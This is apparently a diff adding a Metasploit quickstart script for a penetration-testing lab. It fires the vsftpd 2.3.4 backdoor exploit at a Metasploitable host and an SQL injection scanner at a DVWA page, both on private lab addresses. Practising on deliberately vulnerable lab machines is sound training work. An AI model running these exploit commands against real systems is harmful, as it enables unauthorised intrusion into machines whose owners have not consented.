@@ -1,0 +1,17 @@
+# Kali Linux Lab: Metasploit Quickstart for Lab Targets
+# Ethical testing only.
+
+# Example: vsftpd Exploit on Metasploitable (RHOSTS=192.168.56.101)
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS 192.168.56.101
+set LHOST 192.168.56.100  # Kali IP
+exploit
+
+# Example: SQL Injection Scanner on DVWA (RHOSTS=192.168.56.102)
+use auxiliary/scanner/http/sqlmap
+set RHOSTS 192.168.56.102
+set TARGETURI /DVWA/vulnerabilities/sqli/
+run
+
+# Exit after runs
+exit
